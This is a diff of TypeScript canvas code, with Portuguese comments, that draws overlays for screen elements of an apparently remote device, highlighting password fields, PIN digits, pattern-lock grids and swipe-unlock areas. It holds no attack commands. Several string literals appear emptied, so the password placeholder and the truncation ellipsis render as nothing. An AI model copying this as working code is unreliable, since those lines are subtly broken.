-  const radius = Math.min(8, w / 6, h / 6);
-  // Aplica opacity ao fundo
-  const parsedBg = bgColor.replace(/rgba\((\d+),\s*(\d+),\s*(\d+),\s*([\d.]+)\)/, 
-    (_: string, r: string, g: string, b: string, a: string) => 
-      `rgba(${r}, ${g}, ${b}, ${Math.min(parseFloat(a) + (opacity - 0.7), 1)})`
-  );
-  ctx.fillStyle = parsedBg;
-  ctx.beginPath();
-  safeRoundRect(ctx, x, y, w, h, radius);
-  ctx.fill();
-  
-  // Desenha borda conforme o estilo selecionado
-  ctx.strokeStyle = borderColor;
-  ctx.lineWidth = borderWidth;
-  
-  if (cornerStyle === 'brackets') {
-    // HUD Cantos futuristas
-    const len = Math.max(4, Math.min(10, w / 4, h / 4));
-    ctx.beginPath(); ctx.moveTo(x + len, y); ctx.lineTo(x, y); ctx.lineTo(x, y + len); ctx.stroke();
-    ctx.beginPath(); ctx.moveTo(x + w - len, y); ctx.lineTo(x + w, y); ctx.lineTo(x + w, y + len); ctx.stroke();
-    ctx.beginPath(); ctx.moveTo(x, y + h - len); ctx.lineTo(x, y + h); ctx.lineTo(x + len, y + h); ctx.stroke();
-    ctx.beginPath(); ctx.moveTo(x + w - len, y + h); ctx.lineTo(x + w, y + h); ctx.lineTo(x + w, y + h - len); ctx.stroke();
-  } else if (cornerStyle === 'full-border') {
-    // Borda completa com cantos arredondados
-    ctx.beginPath();
-    safeRoundRect(ctx, x, y, w, h, radius);
-    ctx.stroke();
-  } else if (cornerStyle === 'dots') {
-    // Borda pontilhada
-    ctx.setLineDash([3, 4]);
-    ctx.beginPath();
-    safeRoundRect(ctx, x, y, w, h, radius);
-    ctx.stroke();
-    ctx.setLineDash([]);
-  }
-  // cornerStyle === 'none' nao desenha borda
-  
-  // Desenha texto se existir
-  if (text) {
-    ctx.save();
-    
-    // Calcula tamanho de fonte que cabe no elemento
-    const textLen = text.length;
-    const maxFontByHeight = Math.floor(h * 0.55);
-    const maxFontByWidth = Math.floor((w - 12) / (textLen * 0.52));
-    let fontSize = Math.max(10, Math.min(22, maxFontByHeight, maxFontByWidth));
-    
-    // Teclas do teclado: fonte maior e mais legível
-    if (isKey && text.length <= 2) {
-      fontSize = Math.min(28, h * 0.5);
-    }
-    
-    // Aplica o multiplicador de escala de texto
-    fontSize = Math.round(fontSize * textScale);
-    
-    ctx.font = `600 ${fontSize}px "Segoe UI", -apple-system, sans-serif`;
-    ctx.fillStyle = textColor;
-    ctx.textBaseline = 'middle';
-    ctx.textAlign = 'center';
-    
-    // Trunca texto se necessário
-    const maxWidth = w - 10;
-    let displayText = text;
-    let measured = ctx.measureText(displayText);
-    while (measured.width > maxWidth && displayText.length > 1) {
-      displayText = displayText.slice(0, -1);
-      measured = ctx.measureText(displayText + '…');
-    }
-    if (displayText !== text) {
-      displayText = displayText + '…';
-    }
-    
-    // Sombra para legibilidade
-    ctx.shadowColor = 'rgba(0,0,0,0.8)';
-    ctx.shadowBlur = 3;
-    ctx.shadowOffsetX = 1;
-    ctx.shadowOffsetY = 1;
-    
-    ctx.fillText(displayText, x + w / 2, y + h / 2);
-    ctx.restore();
-  }
-  
-  // Indicadores especiais
+  const interactive = !!(node.clickable || node.editable || node.password || node.isPinDigit || isInput || isKey);
+
   if (node.password) {
-    ctx.save();
-    ctx.font = 'bold 16px Arial';
-    ctx.fillStyle = '#ff6b6b';
-    ctx.shadowColor = '#000';
-    ctx.shadowBlur = 3;
-    ctx.fillText('🔒', x + 5, y - 5);
-    ctx.restore();
+    const dots = (text.match(/[·*]/g) || []).length;
+    text = dots > 0 ? ''.repeat(Math.min(dots, 12)) : '';
   }
-  
-  if (node.isPatternLock && node.bounds) {
-    const cx = node.bounds.x;
-    const cy = node.bounds.y;
-    const cw = node.bounds.w;
-    const ch = node.bounds.h;
-    const rows = node.gridRows || 3;
-    const cols = node.gridCols || 3;
-    const radius = Math.min(cw / (cols * 4), ch / (rows * 4));
-    const drawDot = (dx: number, dy: number) => {
-      ctx.save();
-      ctx.fillStyle = '#ef4444';
-      ctx.beginPath();
-      ctx.arc(dx, dy, radius, 0, Math.PI * 2);
-      ctx.fill();
-      ctx.restore();
-    };
-    if (node.patternGrid && node.patternGrid.length >= rows * cols) {
-      node.patternGrid.forEach(p => drawDot(p.x, p.y));
-    } else {
-      for (let r = 0; r < rows; r++) {
-        for (let c = 0; c < cols; c++) {
-          const dx = cx + (c + 0.5) * (cw / cols);
-          const dy = cy + (r + 0.5) * (ch / rows);
-          drawDot(dx, dy);
-        }
+
+  let box = 'rgba(255,255,255,0.05)';
+  let border = 'rgba(255,255,255,0.16)';
+  let fg = '#e9eef7';
+  let bw = 1;
+
+  if (designTheme === 'matrix') { box = 'rgba(0,45,12,0.55)'; border = 'rgba(57,255,20,0.35)'; fg = '#b9ffb2'; }
+  else if (designTheme === 'neon-red') { box = 'rgba(48,0,0,0.6)'; border = 'rgba(255,70,70,0.42)'; fg = '#ffd2d2'; }
+  else if (designTheme === 'purple-glowing') { box = 'rgba(45,0,40,0.6)'; border = 'rgba(244,114,182,0.42)'; fg = '#ffd8f2'; }
+
+  if (node.password) { box = 'rgba(239,68,68,0.22)'; border = '#ef4444'; fg = '#ffffff'; bw = 2; }
+  else if (node.isPinDigit) { box = 'rgba(255,140,0,0.22)'; border = '#ff9500'; fg = '#fff4e6'; bw = 2; }
+  else if (isInput) { box = 'rgba(34,197,94,0.18)'; border = '#22c55e'; fg = '#eafff1'; bw = 2; }
+  else if (node.clickable || isKey) { box = 'rgba(239,68,68,0.14)'; border = 'rgba(239,68,68,0.8)'; fg = '#ffecec'; bw = 1.5; }
+  else if (isLock) { box = 'rgba(239,68,68,0.14)'; border = 'rgba(239,68,68,0.65)'; fg = '#ffecec'; }
+
+  const radius = Math.min(7, w / 5, h / 5);
+  const drawBox = interactive || !!text;
+  const boxAlpha = Math.min(1, Math.max(0.15, opacity + 0.12));
+  if (drawBox) {
+    ctx.globalAlpha = boxAlpha;
+    ctx.fillStyle = box;
+    ctx.beginPath();
+    safeRoundRect(ctx, x, y, w, h, radius);
+    ctx.fill();
+    ctx.globalAlpha = 1;
+
+    ctx.strokeStyle = border;
+    ctx.lineWidth = bw;
+    if (cornerStyle === 'brackets') {
+      const len = Math.max(3, Math.min(8, w / 4, h / 4));
+      ctx.beginPath(); ctx.moveTo(x + len, y); ctx.lineTo(x, y); ctx.lineTo(x, y + len); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(x + w - len, y); ctx.lineTo(x + w, y); ctx.lineTo(x + w, y + len); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(x, y + h - len); ctx.lineTo(x, y + h); ctx.lineTo(x + len, y + h); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(x + w - len, y + h); ctx.lineTo(x + w, y + h); ctx.lineTo(x + w, y + h - len); ctx.stroke();
+    } else if (cornerStyle === 'full-border') {
+      ctx.beginPath(); safeRoundRect(ctx, x, y, w, h, radius); ctx.stroke();
+    } else if (cornerStyle === 'dots') {
+      ctx.setLineDash([2, 3]); ctx.beginPath(); safeRoundRect(ctx, x, y, w, h, radius); ctx.stroke(); ctx.setLineDash([]);
+    }
+  }
+
+  if (node.isPatternLock && w > 40 && h > 40) {
+    const rows = nodeAny.gridRows || 3;
+    const cols = nodeAny.gridCols || 3;
+    const rr2 = Math.min(w / (cols * 4), h / (rows * 4));
+    ctx.fillStyle = 'rgba(239,68,68,0.9)';
+    for (let rr = 0; rr < rows; rr++) {
+      for (let cc = 0; cc < cols; cc++) {
+        ctx.beginPath();
+        ctx.arc(x + (cc + 0.5) * (w / cols), y + (rr + 0.5) * (h / rows), rr2, 0, Math.PI * 2);
+        ctx.fill();
       }
     }
   }
 
-  if (node.isSwipeUnlock && node.bounds) {
-    const hint = node.swipeHint;
-    const sx = hint ? hint.sx : node.bounds.x + node.bounds.w / 2;
-    const sy = hint ? hint.sy : node.bounds.y + node.bounds.h * 0.75;
-    const ex = hint ? hint.ex : node.bounds.x + node.bounds.w / 2;
-    const ey = hint ? hint.ey : node.bounds.y + node.bounds.h * 0.25;
-    ctx.save();
-    ctx.strokeStyle = '#10b981';
-    ctx.lineWidth = 3;
-    ctx.beginPath();
-    ctx.moveTo(sx, sy);
-    ctx.lineTo(ex, ey);
-    ctx.stroke();
-    const angle = Math.atan2(ey - sy, ex - sx);
-    const ah = 10;
-    const aw = 6;
-    ctx.beginPath();
-    ctx.moveTo(ex, ey);
-    ctx.lineTo(ex - aw * Math.cos(angle - Math.PI / 6), ey - aw * Math.sin(angle - Math.PI / 6));
-    ctx.lineTo(ex - ah * Math.cos(angle), ey - ah * Math.sin(angle));
-    ctx.lineTo(ex - aw * Math.cos(angle + Math.PI / 6), ey - aw * Math.sin(angle + Math.PI / 6));
-    ctx.closePath();
-    ctx.fillStyle = '#10b981';
-    ctx.fill();
-    ctx.restore();
+  if (text && w > 10 && h > 9) {
+    let fs = Math.min(20, Math.max(9, Math.min(h * 0.5, (w - 8) / (text.length * 0.55))));
+    if (isKey && text.length <= 2) fs = Math.min(26, h * 0.55);
+    fs = Math.round(fs * textScale);
+    if (fs >= 8) {
+      ctx.font = (interactive ? '700 ' : '500 ') + fs + 'px "Segoe UI", system-ui, sans-serif';
+      ctx.fillStyle = fg;
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      const maxW = w - 6;
+      let dt = text;
+      if (ctx.measureText(dt).width > maxW) {
+        while (dt.length > 1 && ctx.measureText(dt + '').width > maxW) dt = dt.slice(0, -1);
+        dt = dt + '';
+      }
+      ctx.fillText(dt, x + w / 2, y + h / 2);
+    }
   }
-  if (node.focused && !node.password) {
-    ctx.save();
-    ctx.font = 'bold 14px Arial';
-    ctx.fillStyle = '#ef4444';
-    ctx.shadowColor = '#000';
-    ctx.shadowBlur = 3;
-    ctx.fillText('—', x + w - 12, y + 12);
-    ctx.restore();
-  }
-  // Coordenadas do elemento (se habilitado)
-  if (showCoords && node.bounds) {
-    ctx.save();
-    const cx2 = Math.round(x + w / 2);
-    const cy2 = Math.round(y + h / 2);
+
+  if (showCoords) {
     ctx.font = '500 9px monospace';
-    ctx.fillStyle = 'rgba(201,168,168,0.9)';
-    ctx.textAlign = 'right';
+    ctx.fillStyle = 'rgba(255,255,255,0.4)';
+    ctx.textAlign = 'left';
     ctx.textBaseline = 'bottom';
-    ctx.fillText(`${cx2},${cy2}`, x + w - 2, y + h - 1);
-    ctx.restore();
+    ctx.fillText(Math.round(x) + ',' + Math.round(y) + ' ' + Math.round(w) + 'x' + Math.round(h), x + 2, y + h - 1);
   }
 };
+
+
 
